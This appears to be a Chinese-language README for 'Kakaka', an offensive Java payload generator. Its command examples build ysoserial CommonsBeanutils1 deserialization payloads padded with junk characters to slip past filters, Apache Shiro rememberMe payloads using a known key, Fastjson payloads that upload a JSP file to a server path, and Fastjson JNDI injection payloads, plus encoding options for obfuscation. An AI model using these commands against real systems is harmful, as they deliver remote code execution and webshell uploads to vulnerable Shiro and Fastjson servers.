# Kakaka

## 2.0 改为交互式

![](https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/20211215154823.png)

得到结果

![](https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/20211215154842.png)

## 生成各种payload

java -jar Kakaka.jar -yso CommonsBeanutils1 -c whoami -d 2000 -raw 生成一个带2000个脏字符的原始payload

![](https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/20211122204631.png)
 
java -jar Kakaka.jar -shiro -g CommonsBeanutils1 -c whoami -k a3dvbmcAAAAAAAAAAAAAAA== 指定key和gadget生成shiro payload

![](https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/20211122204714.png)

java -jar Kakaka.jar -fastjson upload -lf dogma.jsp -rf /tmp/dogma.jsp 生成fastjson文件上传payload

![](https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/20211122204800.png)

java -jar Kakaka.jar -fastjson jndi -u 127.0.0.1 

![](https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/20211122204823.png)

## 支持编码

按照参数顺序编码

支持：

  -ue  url编码
  
  -he  html编码
  
  -be  base64编码
  
  -xe  xml编码
